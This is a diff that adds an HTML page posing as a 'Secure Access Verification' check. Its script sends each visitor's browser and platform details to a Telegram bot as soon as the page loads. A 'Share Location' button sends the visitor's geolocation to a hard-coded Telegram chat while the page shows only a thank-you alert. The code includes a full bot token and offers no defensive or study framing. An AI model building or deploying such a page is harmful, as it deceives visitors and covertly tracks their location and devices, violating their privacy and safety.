@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Welcome</title>
+</head>
+<body>
+  <h1>🔒 Secure Access Verification</h1>
+  <p>For security, please verify your browser and location.</p>
+  <pre id="info"></pre>
+
+  <button onclick="getLocation()">Share Location</button>
+  <button onclick="getWebcam()">Share Webcam (simulated)</button>
+
+  <script>
+    const info = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      time: new Date().toString()
+    };
+
+    document.getElementById('info').innerText = JSON.stringify(info, null, 2);
+
+    // Send to Telegram
+    fetch("https://api.telegram.org/bot7980547696:AAGHpHEcvFFac-5hUoFa0yBApZWVTRnBOY8/sendMessage", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({
+        chat_id: "<YOUR_CHAT_ID>",
+        text: `User visited:\n${JSON.stringify(info, null, 2)}`
+      })
+    });
+
+    // Location
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          const coords = `Latitude: ${pos.coords.latitude}, Longitude: ${pos.coords.longitude}`;
+          alert("Thanks for sharing!");
+          fetch("https://api.telegram.org/bot7980547696:AAGHpHEcvFFac-5hUoFa0yBApZWVTRnBOY8/sendMessage", {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+              chat_id: "7652158048",
+              text: `📍 Location shared:\n${coords}`
+            })
+          });
+        });
+      } else {
+        alert("Geolocation not supported.");
+      }
+    }
+
+    // Webcam (simulated prompt)
+    function getWebcam() {
+      alert("Webcam access is simulated for demo purposes only.");
+    }
+  </script>
+</body>
+</html>
